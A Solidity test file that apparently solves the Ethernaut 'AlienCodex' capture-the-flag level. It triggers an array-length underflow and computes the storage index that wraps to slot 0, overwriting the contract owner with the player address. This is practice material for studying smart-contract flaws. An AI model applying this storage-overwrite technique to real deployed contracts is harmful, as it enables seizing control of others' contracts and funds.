pragma solidity ^0.5.0;

import 'levels/AlienCodexFactory.sol';
import 'levels/AlienCodex.sol';
import '0.5/TestUtils05.sol';
import 'ds-test/test.sol';

contract AlienCodexTest is DSTest {
  address player;
  Utils05 utils;
  AlienCodexFactory alienCodexFactory;
  address payable alienCodexAddress;
  AlienCodex alienCodex;

  function setUp() public {
    utils = new Utils05();
    player = utils.createUsers(1)[0];
    alienCodexFactory = new AlienCodexFactory();
    alienCodexAddress = address(uint160(alienCodexFactory.createInstance(player)));
    alienCodex = AlienCodex(alienCodexAddress);
  }

  function getIndex() public pure returns (uint256) {
    bytes32 start = keccak256(abi.encode(bytes32(uint256(1))));
    uint256 startCodex = uint256(start);
    uint256 max = 2 ** 256 - 1;
    return max - startCodex + 1;
  }

  function testHack() public {
    // pass contacted modified
    alienCodex.make_contact();

    // cause underflow to be able to write on full storage with the codex array
    alienCodex.retract();

    // overwrite slot that contains owner
    alienCodex.revise(getIndex(), bytes32(uint256(uint160(player))));

    assertTrue(alienCodexFactory.validateInstance(alienCodexAddress, player), 'Level not solved');
  }
}
